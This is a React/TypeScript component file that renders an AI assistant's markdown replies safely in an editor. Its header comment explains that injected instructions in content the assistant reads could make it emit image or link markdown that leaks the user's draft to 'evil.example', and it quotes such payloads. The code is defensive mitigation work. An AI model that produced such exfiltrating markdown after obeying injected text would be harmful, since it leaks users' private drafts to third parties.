import type { Components } from "react-markdown";

/**
 * How the assistant's own text is turned into elements.
 *
 * The assistant reads things it did not write and we did not either: content
 * an editor pasted in, pages of the site, and (with web search) the web. Any
 * of those can carry instructions, and a model can follow them. So nothing the
 * model writes may make the editor's browser send a request on its own:
 *
 * - **An image is never loaded.** `![](https://evil.example/?d=<draft>)` would
 *   send whatever the model put in that URL the moment the reply renders,
 *   without anyone clicking anything. It shows as the same `[image: alt]`
 *   placeholder the composer uses. Images the session made itself (the gallery
 *   above a reply) are not markdown, and are not affected.
 * - **A link names where it goes.** `[the docs](https://evil.example/?d=…)` is
 *   only a click away from leaking, and the text can say anything, so the
 *   host is shown beside it, unless the text already is the URL or the host.
 *   It opens in a new tab without a referrer or an opener.
 */
export function AssistantImage({ alt }: { alt?: string }) {
  return (
    <span className="italic text-fg-secondary">
      [{alt ? `image: ${alt}` : "image"}]
    </span>
  );
}

export function AssistantLink({
  href,
  children,
}: {
  href?: string;
  children?: React.ReactNode;
}) {
  const host = externalHost(href);
  return (
    <>
      <a
        href={href}
        target="_blank"
        rel="noopener noreferrer nofollow"
        referrerPolicy="no-referrer"
      >
        {children}
      </a>
      {host !== null &&
        href !== undefined &&
        !textShowsHost(children, href, host) && (
          <span className="ml-1 text-xs text-fg-secondary">({host})</span>
        )}
    </>
  );
}

export const assistantMarkdownComponents: Components = {
  img: ({ alt }) => <AssistantImage alt={alt} />,
  a: ({ href, children }) => (
    <AssistantLink href={href}>{children}</AssistantLink>
  ),
};

/** The host of an absolute http(s) URL, or null for anything else. */
export function externalHost(href: string | undefined): string | null {
  if (href === undefined) {
    return null;
  }
  try {
    const url = new URL(href);
    if (url.protocol !== "http:" && url.protocol !== "https:") {
      return null;
    }
    return url.host;
  } catch {
    // Relative: a link into the Studio itself, which is where it already is.
    return null;
  }
}

/**
 * Whether the link's text already says where it goes: it is the address, or
 * the host. Anything looser can be spoofed: "banana.co" contains "a.co".
 */
function textShowsHost(
  children: React.ReactNode,
  href: string,
  host: string,
): boolean {
  if (typeof children !== "string") {
    return false;
  }
  const text = children.trim().replace(/\/$/, "");
  return (
    text === href.replace(/\/$/, "") ||
    text === host ||
    text.replace(/^https?:\/\//, "") ===
      href.replace(/^https?:\/\//, "").replace(/\/$/, "")
  );
}
